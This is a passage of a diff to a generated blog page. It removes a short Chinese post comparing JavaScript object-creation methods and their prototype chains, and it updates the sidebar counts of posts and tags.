-<h1 id="几种创建方式对比"><a href="#几种创建方式对比" class="headerlink" title="几种创建方式对比"></a>几种创建方式对比</h1><p>let a = null                     ===&gt; null<br>let b = Object.create(null)      ===&gt; {} 但没有任何属性<br>let c = {}                       ===&gt; {} <strong>proto</strong>指向Object<br>let d = new Object()             ===&gt; {} <strong>proto</strong>指向Object<br>let e = new Object(null)         ===&gt; {} <strong>proto</strong>指向Object<br>let f = Object.create(c)         ===&gt; {} <strong>proto</strong>指向c, <strong>proto</strong>.<strong>proto</strong>指向Object<br>!(obj4)[/image/ob4.png]<br>c instanceof Object , d instanceof Object ,e instanceof Object ===&gt; true</p>
-<p>let dd = {a:1}<br>let cc = new Object(dd)<br>let ee = Object.create(dd)<br>console.log(cc,ee)<br>!(obj3)[/image/ob3.png]<br>dd.isPrototypeOf(cc)  ===&gt;false<br>dd.isPrototypeOf(ee)  ===&gt;true</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1803,7 +1706,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">236</span>
+              <span class="site-state-item-count">239</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1820,7 +1723,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-count">21</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
